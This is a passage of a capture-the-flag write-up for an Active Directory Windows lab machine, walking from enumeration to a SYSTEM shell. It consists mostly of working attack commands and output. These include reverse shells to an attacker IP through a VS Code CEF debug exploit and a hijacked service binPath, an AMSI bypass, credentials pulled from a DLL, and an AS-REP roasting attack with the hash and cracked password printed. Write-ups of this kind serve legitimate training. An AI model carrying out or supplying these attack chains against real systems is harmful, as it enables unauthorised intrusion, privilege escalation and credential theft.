|      | parsing the registry.                                 |
+------+-------------------------------------------------------+
[*] Found 8 result(s).

Name                         FullName
----                         --------
Microsoft SQL Server         C:\Program Files (x86)\Microsoft SQL Server
Microsoft Visual Studio 10.0 C:\Program Files (x86)\Microsoft Visual Studio 10.0
Microsoft                    C:\Program Files\Microsoft
Microsoft SQL Server         C:\Program Files\Microsoft SQL Server
Microsoft Visual Studio 10.0 C:\Program Files\Microsoft Visual Studio 10.0
Microsoft VS Code            C:\Program Files\Microsoft VS Code
VMware                       C:\Program Files\VMware
VMware Tools                 C:\Program Files\VMware\VMware Tools
<strong>
</strong><strong>+------+------------------------------------------------+------+
</strong>| TEST | APPS > Running Processes                       | INFO |
+------+------------------------------------------------+------+
| DESC | List processes that are not owned by the current user |
|      | and filter out common processes such as               |
|      | 'svchost.exe'.                                        |
+------+-------------------------------------------------------+
[*] Found 37 result(s).

Name                                    Id Path SessionId User
----                                    -- ---- --------- ----
Code                                   988              1
Code                                  2252              1
Code                                  2272              1
Code                                  3172              1
Code                                  4628              1
Code                                  5260              1
Code                                  5304              1
Code                                  5484              1
Code                                  5488              1
Code                                  6036              1

IPv4 TCP   127.0.0.1:18256                     LISTENING 2252 Code
IPv4 TCP   127.0.0.1:30980                     LISTENING 5304 Code
IPv4 TCP   127.0.0.1:46973                     LISTENING 5032 Code
</code></pre>

For some reason, Visual Studio was running a lot of processes and even had some ports open for it.&#x20;

### VS Code --> Cyork Shell

There were loads of processes run as Code, so let's take a look at that. The VS Code directory had some files within it.&#x20;

```
 *Evil-WinRM* PS C:\Program Files\Microsoft VS Code> dir


    Directory: C:\Program Files\Microsoft VS Code


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2020   3:18 AM                bin
d-----         1/9/2020   3:18 AM                locales
d-----         1/9/2020   3:18 AM                resources
d-----         1/9/2020   3:18 AM                swiftshader
d-----         1/9/2020   3:18 AM                tools
-a----        8/15/2019   5:18 PM         167621 chrome_100_percent.pak
-a----        8/15/2019   5:18 PM         249617 chrome_200_percent.pak
-a----        8/15/2019   5:28 PM       92150648 Code.exe
-a----        8/15/2019   5:18 PM            342 Code.VisualElementsManifest.xml
-a----        8/15/2019   5:27 PM        4355424 d3dcompiler_47.dll
-a----        8/15/2019   5:27 PM        1853520 ffmpeg.dll
-a----        8/15/2019   5:18 PM       10221472 icudtl.dat
-a----        8/15/2019   5:27 PM         118344 libEGL.dll
-a----        8/15/2019   5:27 PM        5112912 libGLESv2.dll
-a----        8/15/2019   5:18 PM         125011 natives_blob.bin
-a----        8/15/2019   5:27 PM        2958952 osmesa.dll
-a----        8/15/2019   5:18 PM        8720759 resources.pak
-a----        8/15/2019   5:18 PM         613268 snapshot_blob.bin
-a----         1/9/2020   3:18 AM         445419 unins000.dat
-a----         1/9/2020   3:17 AM        1244024 unins000.exe
-a----         1/9/2020   3:18 AM          22739 unins000.msg
-a----        8/15/2019   5:18 PM        1012440 v8_context_snapshot.bin
```

Within the Microsoft VS Code file, there was a `Code.exe` binary present, and I found this StackOverflow post that gave me the command to find its version (I was struggling to run `.\Code.exe --version` previously).

{% embed url="https://stackoverflow.com/questions/68966978/get-command-version-number" %}

```
*Evil-WinRM* PS C:\Program Files\Microsoft VS Code> (Get-Command .\code.exe).version

Major  Minor  Build  Revision
-----  -----  -----  --------
1      37     1      0
```

Then, we can enumerate the possible exploits.&#x20;

{% embed url="https://www.cybersecurity-help.cz/vdb/microsoft/vscode/1.37.1/" %}

This machine was released in 2020, so we can ignore the 2023 exploits. There was only one Privilege Escalation one which looked promising as it involved injecting code into existing processes.&#x20;

The exploit involves exploiting the debug ports that are left open by the process, and we should be able to get RCE for the user context that `Code.exe` runs in.&#x20;

{% embed url="https://iwantmore.pizza/posts/cve-2019-1414.html" %}

VS Code is built on Electron, so we should be looking for exploits that are able to communicate with the port that is open. On Hacktricks, there's a page detailing CEF Deug abuse using `cefdebug.exe`.

{% embed url="https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md" %}

{% embed url="https://github.com/taviso/cefdebug" %}

We can grab a copy of the compiled binary and transfer it to the machine. We can first run it to find the target port we want.&#x20;

```
*Evil-WinRM* PS C:\users\alcibiades> .\cefdebug.exe
cefdebug.exe : [2023/06/25 22:49:29:8700] U: There are 3 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2023/06/25 22:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2023/06/25 22:49:49:9161] U: There were 1 servers that appear to be CEF debuggers.
[2023/06/25 22:49:49:9161] U: ws://127.0.0.1:52954/0c8874f7-9688-4ce6-ae33-973747ba8969
```

This exploit was weird, as it took me ages to get a shell, but I eventually did.

{% code overflow="wrap" %}
```
.\cefdebug --code "process.mainModule.require('child_process').exec('C:/Windows/Tasks/nc.exe 10.10.14.42 443 -e cmd')" --url ws://127.0.0.1:2306/58c5d2a4-d072-479b-a0ad-6762d38e5a36
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>

### Inetpub DLL --> Credentials

This user has access to the `inetpub` directory:

```
Directory of C:\inetpub\wwwroot

01/07/2020  10:28 PM    <DIR>          .
01/07/2020  10:28 PM    <DIR>          ..
01/07/2020  10:28 PM    <DIR>          aspnet_client
01/07/2020  10:28 PM    <DIR>          assets
01/07/2020  10:28 PM    <DIR>          bin
01/07/2020  10:28 PM    <DIR>          Content
01/07/2020  11:50 PM    <DIR>          css
01/06/2020  05:49 PM             3,614 favicon.ico
01/07/2020  10:28 PM    <DIR>          fonts
01/06/2020  11:36 PM                98 Global.asax
01/07/2020  10:28 PM    <DIR>          images
01/07/2020  10:28 PM    <DIR>          img
01/07/2020  11:52 PM             1,098 index.html
01/07/2020  11:50 PM    <DIR>          js
01/07/2020  10:28 PM    <DIR>          Scripts
01/07/2020  10:28 PM    <DIR>          Views
01/09/2020  05:13 AM             3,640 Web.config
```

Within the `bin` file, there were some DLLs:

```
 Directory of C:\inetpub\wwwroot\bin

01/07/2020  10:28 PM    <DIR>          .
01/07/2020  10:28 PM    <DIR>          ..
02/21/2013  08:13 PM           102,912 Antlr3.Runtime.dll
02/21/2013  08:13 PM           431,616 Antlr3.Runtime.pdb
05/24/2018  01:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
07/24/2012  11:18 PM            45,416 Microsoft.Web.Infrastructure.dll
01/09/2020  05:13 AM            13,824 MultimasterAPI.dll
01/09/2020  05:13 AM            28,160 MultimasterAPI.pdb
02/17/2018  09:14 PM           664,576 Newtonsoft.Json.dll
01/07/2020  10:28 PM    <DIR>          roslyn
11/28/2018  12:30 AM           178,808 System.Net.Http.Formatting.dll
11/28/2018  12:28 AM            27,768 System.Web.Cors.dll
01/27/2015  03:34 PM           139,976 System.Web.Helpers.dll
11/28/2018  12:31 AM            39,352 System.Web.Http.Cors.dll
11/28/2018  12:31 AM           455,096 System.Web.Http.dll
01/31/2018  11:49 PM            77,520 System.Web.Http.WebHost.dll
01/27/2015  03:32 PM           566,472 System.Web.Mvc.dll
02/11/2014  02:56 AM            70,864 System.Web.Optimization.dll
01/27/2015  03:32 PM           272,072 System.Web.Razor.dll
01/27/2015  03:34 PM            41,672 System.Web.WebPages.Deployment.dll
01/27/2015  03:34 PM           211,656 System.Web.WebPages.dll
01/27/2015  03:34 PM            39,624 System.Web.WebPages.Razor.dll
07/17/2013  04:33 AM         1,276,568 WebGrease.dll
```

The application also seems to be using this DLL for something:

```
C:\inetpub\wwwroot>type Global.asax
type Global.asax
<%@ Application Codebehind="Global.asax.cs" Inherits="MultimasterAPI.Global" Language="C#" %>

C:\inetpub\wwwroot>type Web.config
type Web.config
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301879
  -->
<configuration>
  <connectionStrings></connectionStrings>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <system.web>
    <compilation targetFramework="4.6.1" />
    <httpRuntime targetFramework="4.6.1" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="Newtonsoft.Json" publicKeyToken="30ad4fe6b2a6aeed" />
        <bindingRedirect oldVersion="0.0.0.0-11.0.0.0" newVersion="11.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.2.3.0" newVersion="5.2.3.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="WebGrease" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-1.5.2.14234" newVersion="1.5.2.14234" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Http" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-5.2.7.0" newVersion="5.2.7.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Net.Http.Formatting" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-5.2.7.0" newVersion="5.2.7.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=2.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" />
    </compilers>
  </system.codedom>
  <system.webServer>
    <handlers>
      <remove name="ExtensionlessUrlHandler-Integrated-4.0" />
      <remove name="OPTIONSVerbHandler" />
      <remove name="TRACEVerbHandler" />
      <add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="*" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" />
    </handlers>
  </system.webServer>
</configuration>
<!--ProjectGuid: D8123343-8775-434A-9C4D-36B26C118E91-->
```

The `Web.Config` file doesn't seem to use it, making it weirder. I downloaded this file back to my machien for some reverse engineering. Since it was a DLL file, we can open it up in DnSpy.exe.

Within it, we can find some hardcoded credentials:

<figure><img src="../../../.gitbook/assets/image (2319).png" alt=""><figcaption></figcaption></figure>

Since we have access to the `C:\Users` directory, we can check which user is this password valid with, and `sbauer` is the one!

```
$ crackmapexec smb megacorp.local -u sbauer -p 'D3veL0pM3nT!'
SMB         megacorp.local  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
```

We can then `evil-winrm` in as this user:

<figure><img src="../../../.gitbook/assets/image (1366).png" alt=""><figcaption></figcaption></figure>

### GenericWrite --> Jorden Shell

From the Bloodhond we did earlier, we can see that this user has `GenericWrite` privileges over `jorden`:

<figure><img src="../../../.gitbook/assets/image (1908).png" alt=""><figcaption></figcaption></figure>

To exploit this, we can use PowerView.ps1. However, it seems AMSI is blocking us:

```
*Evil-WinRM* PS C:\Users\sbauer\Documents> . .\Power.ps1
At C:\Users\sbauer\Documents\Power.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At C:\Users\sbauer\Documents\Power.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

This is pretty easy to bypass since we have an `evil-winrm` shell. We can just use `Bypass-4MSI` to do so:

```
*Evil-WinRM* PS C:\Users\sbauer\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!

*Evil-WinRM* PS C:\Users\sbauer\Documents> . .\Power.ps1
```

To abuse this, I learned from PayloadAllTheThings that we can basically set the attribute required for AS-REP Roasting to work:

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md" %}

```powershell
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-DomainUser jorden | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

*Evil-WinRM* PS C:\Users\sbauer\Documents> Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=MEGACORP,DC=LOCAL
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=jorden)(name=jorden)(displayname=jorden))))
Verbose: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'jorden'

*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-DomainUser jorden | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
DONT_REQ_PREAUTH               4194304
```

Then, we can use `impacket-GetNPUsers` to get the hash required.&#x20;

{% code overflow="wrap" %}
```
$ GetNPUsers.py -no-pass -dc-ip megacorp.local MEGACORP/jorden
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for jorden
$krb5asrep$23$jorden@MEGACORP:0bb6522c4c81e9ee90f0cc0bd92e9068$4e27c205e518f96ef14e152bae72576279532f7550e1e86147721862cbffbdd7bf6a0176da066b734fb4a5e8df1ba5384d01f3bc57e732cd4e5d7331e5ff4fc1e298a47dd682b6c2cb837d87bf2eeb3fb43df24f809570ba11bce7c36059a58691893e4a44c82ba07470458b27b055c604c34282b0959b0b199af57a0c7356d052473a36d8f4f3161f3c23f46c99ca37095dded1366b5c6bc73a54f6463591757b79522bee3616ddf845a313bdf1b9524d6c1ab21ac9daf3a8c7e978c9bf9ddae536f224adc1126856897d72c4d812dc6ef745b0f3fb7d95905091d00df296ea87c5d781e8c164bbd430
```
{% endcode %}

This hash can be easily cracked by `john`.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainforest786    ($krb5asrep$23$jorden@MEGACORP)     
1g 0:00:00:02 DONE (2023-06-26 14:33) 0.3484g/s 1533Kp/s 1533Kc/s 1533KC/s rainian..raincole
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<figure><img src="../../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>

### Server Operators --> Root

`jorden` has loads of privileges available and is part of a lot of groups:

```
*Evil-WinRM* PS C:\Users\jorden\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

*Evil-WinRM* PS C:\Users\jorden\Documents> net user jorden
User name                    jorden
Full Name                    Jorden Mclean
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:48:17 PM
Password expires             Never
Password changeable          1/10/2020 5:48:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/25/2023 11:39:57 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Server Operators
Global Group memberships     *Domain Users         *Developers
```

Technically, SeBackupPrivilege allows us to read the `root.txt` directly, but getting an admin shell is of course better. So since we are part of the Server Operators group, we can start our enumeration from there.&#x20;

From Hacktricks, I gathered that the Server Operators group was able to do these:

* Allow log on locally
* Back up files and directories
* [`SeBackupPrivilege`](broken-reference) and [`SeRestorePrivilege`](broken-reference)
* Change the system time
* Change the time zone
* Force shutdown from a remote system
* Restore files and directories
* Shut down the system
* control local services

All of these are not super interesting, except for the last one. We can control local services, meaning that we can do stuff like change service paths to run payloads as the SYSTEM user. As such, I used `PowerUp.ps1` to do my checks on what services I could manipulate.&#x20;

This didn't work because it seems that we cannot access the Service Manager:

```
*Evil-WinRM* PS C:\> sc.exe query type= service
[SC] OpenSCManager FAILED 5:

Access is denied.
```

I couldn't run WinPEAS on the machine, so I used my own Windows host to find a service that we could edit, and this took a while.&#x20;

We can find all the services using `reg query`:

```
*Evil-WinRM* PS C:\Users\jorden\Documents> reg query HKLM\system\currentcontrolset\services

HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET CLR Data
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET CLR Networking
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET Data Provider for Oracle
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET Data Provider for SqlServer
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NET Memory Cache 4.0
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\1394ohci
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\3ware
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ACPI
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiDev
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpiex
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpipagr
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiPmi
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpitime
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADOVMPPackage
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX
<TRUNCATED>
```

Within this huge list, there were loads of services that weren't valid to use because they were already running or I could not edit the `binPath` variable.&#x20;

> Used 0xdf's writeup because I got lazy finding the service lol.&#x20;

The first service I noticed were `browser` and `bowser`. I just thought the latter was funny, but the former was one that we could abuse.  First, we just need to change the `binpath` and then run  `start` to start it again. This gives us a `root` shell.&#x20;

```
*Evil-WinRM* PS C:\Windows\Tasks> sc.exe config browser binPath= "C:\Windows\Tasks\nc64.exe -e cmd.exe 10.10.14.42 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Windows\Tasks> sc.exe start browser
```

<figure><img src="../../../.gitbook/assets/image (1920).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
